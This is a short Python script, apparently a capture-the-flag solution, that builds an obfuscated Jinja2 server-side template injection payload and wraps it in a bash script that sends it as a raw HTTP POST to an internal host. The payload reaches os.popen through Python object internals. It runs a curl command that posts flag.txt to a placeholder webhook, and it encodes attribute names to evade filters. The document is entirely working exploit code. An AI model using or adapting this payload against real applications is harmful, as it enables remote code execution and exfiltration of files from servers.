import urllib.parse

def formatting(payload):
    formatted_str = '+'.join(f"'%c' % {ord(c)}" for c in payload)
    return formatted_str

payload = f"{{{{()|attr({formatting('__class__')})|attr({formatting('__base__')})|attr({formatting('__subclasses__')})()|attr({formatting('__getitem__')})(100)|attr({formatting('__init__')})|attr({formatting('__globals__')})|attr({formatting('__getitem__')})({formatting('__import__')})({formatting('os')})|attr({formatting('popen')})({formatting('curl -d @flag.txt WEBHOOK')})|attr({formatting('read')})()}}}}"

shell_cmd=f'''
#!/bin/bash
exec 3<>/dev/tcp/internal/9000

DATA="name={urllib.parse.quote(payload)}"

echo -e "POST / HTTP/1.1\r\nHost: www.google.com\r\nContent-Type: application/x-www-form-urlencoded\r\nContent-Length: ${{#DATA}}\r\nConnection: close\r\n\r\n$DATA" >&3

cat <&3'''

print(shell_cmd)
